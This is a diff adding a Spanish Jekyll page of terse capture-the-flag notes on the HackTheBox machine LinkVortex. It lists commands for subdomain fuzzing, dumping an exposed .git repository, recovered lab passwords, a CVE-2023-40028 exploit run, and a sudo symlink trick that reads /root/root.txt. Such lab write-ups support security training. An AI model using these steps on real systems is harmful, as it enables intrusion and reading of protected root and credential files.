@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://linkvortex.htb &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: FUZZ.linkvortex.htb&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt &lt;span class=&quot;nt&quot;&gt;-mc&lt;/span&gt; all &lt;span class=&quot;nt&quot;&gt;-ac&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-u</span> http://linkvortex.htb <span class="nt">-H</span> <span class="s2">"Host: FUZZ.linkvortex.htb"</span> <span class="nt">-w</span> /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-mc</span> all <span class="nt">-ac</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="nt">--mirror</span> <span class="nt">-I</span> .git http://dev.linkvortex.htb/.git/
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="nt">--mirror</span> <span class="nt">-I</span> .git http://dev.linkvortex.htb/.git/
+<span class="nb">sudo </span>git restore <span class="nb">.</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git log
+git status
+git diff <span class="nt">--cached</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin \ OctopiFociPilfer45
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash CVE-2023-40028 <span class="nt">-u</span> admin@linkvortex.htb <span class="nt">-p</span> OctopiFociPilfer45 <span class="nt">-h</span> http://linkvortex.htb
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bob \ fibber-talented-worth
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries <span class="k">for </span>bob on linkvortex:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty, env_keep+<span class="o">=</span>CHECK_CONTENT
+
+User bob may run the following commands on linkvortex:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh <span class="k">*</span>.png
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">QUAR_DIR</span><span class="o">=</span><span class="s2">"/var/quarantined"</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="nv">$CHECK_CONTENT</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span> <span class="c">#Hay que definirla antes del script</span>
+  <span class="nv">CHECK_CONTENT</span><span class="o">=</span><span class="nb">false
+</span><span class="k">fi
+
+</span><span class="nv">LINK</span><span class="o">=</span><span class="nv">$1</span>
+
+<span class="k">if</span> <span class="o">!</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$LINK</span><span class="s2">"</span> <span class="o">=</span>~ <span class="se">\.</span>png<span class="nv">$ </span><span class="o">]]</span><span class="p">;</span> <span class="k">then</span> <span class="c">#Tiene que acabar en png</span>
+  /usr/bin/echo <span class="s2">"! First argument must be a png file !"</span>
+  <span class="nb">exit </span>2
+<span class="k">fi
+
+if</span> /usr/bin/sudo /usr/bin/test <span class="nt">-L</span> <span class="nv">$LINK</span><span class="p">;</span><span class="k">then
+  </span><span class="nv">LINK_NAME</span><span class="o">=</span><span class="si">$(</span>/usr/bin/basename <span class="nv">$LINK</span><span class="si">)</span>
+  <span class="nv">LINK_TARGET</span><span class="o">=</span><span class="si">$(</span>/usr/bin/readlink <span class="nv">$LINK</span><span class="si">)</span>
+  <span class="k">if</span> /usr/bin/echo <span class="s2">"</span><span class="nv">$LINK_TARGET</span><span class="s2">"</span> | /usr/bin/grep <span class="nt">-Eq</span> <span class="s1">'(etc|root)'</span><span class="p">;</span><span class="k">then</span>
+    /usr/bin/echo <span class="s2">"! Trying to read critical files, removing link [ </span><span class="nv">$LINK</span><span class="s2"> ] !"</span>
+    /usr/bin/unlink <span class="nv">$LINK</span>
+  <span class="k">else</span>
+    /usr/bin/echo <span class="s2">"Link found [ </span><span class="nv">$LINK</span><span class="s2"> ] , moving it to quarantine"</span>
+    /usr/bin/mv <span class="nv">$LINK</span> <span class="nv">$QUAR_DIR</span>/
+    <span class="k">if</span> <span class="nv">$CHECK_CONTENT</span><span class="p">;</span><span class="k">then</span>
+      /usr/bin/echo <span class="s2">"Content:"</span>
+      /usr/bin/cat <span class="nv">$QUAR_DIR</span>/<span class="nv">$LINK_NAME</span> 2&gt;/dev/null
+    <span class="k">fi
+  fi
+fi</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> /root/root.txt img.png
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> /tmp/pentest/img.png img2.png
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh img2.png 
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
